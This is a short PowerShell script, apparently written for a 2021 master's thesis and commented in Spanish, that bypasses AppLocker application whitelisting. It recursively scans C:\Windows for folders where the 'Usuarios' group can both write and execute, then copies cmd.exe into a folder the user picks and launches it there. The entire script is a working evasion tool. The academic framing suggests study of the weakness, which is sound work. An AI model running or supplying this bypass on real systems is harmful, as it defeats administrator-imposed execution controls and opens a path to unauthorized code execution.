# AppLocker Bypass TFM 2021
#
# @Author: Alejandro Salas Hernandez
#
# Primer paso: buscar donde se puede escribir y ejecutar en la carpeta destino como usuarios

$group = "*Usuarios*"
$destino = "C:\Windows"
$shell = "\cmd.exe"
write-output "[*] Buscando carpetas vulnerables recursivamente en $destino"
foreach($_ in (Get-ChildItem $destino -recurse -ErrorAction SilentlyContinue)){
    if($_.PSIsContainer)
    {
		try{
			$res = Get-acl $_.FullName 
		} catch{
			continue
		}
		foreach ($a in $res.access){
			if ($a.IdentityReference -like $group){
				if ( ($a.FileSystemRights -like "*Write*" -or $a.FileSystemRights -like "*CreateFiles*" ) -and $a.FileSystemRights -like "*ReadAndExecute*" ){
					write-host "[+] " $_.FullName -foregroundcolor "green"
				}
				
			}
		}
    }
}
write-output "[*] Indique la ruta de una de las carpetas encontradas en $destino para copiar tu shell"
$rutashell = Read-Host "Ruta"
Copy-Item -Path C:\Windows\System32\cmd.exe -Destination $rutashell
write-output "[*] Shell copiada a la ruta indicada..."
write-output "[*] Ejecutando nueva shell..."
Invoke-Item $rutashell$shell
Read-Host -Prompt "[*] Shell ejecutada, presione <Enter> para salir..."
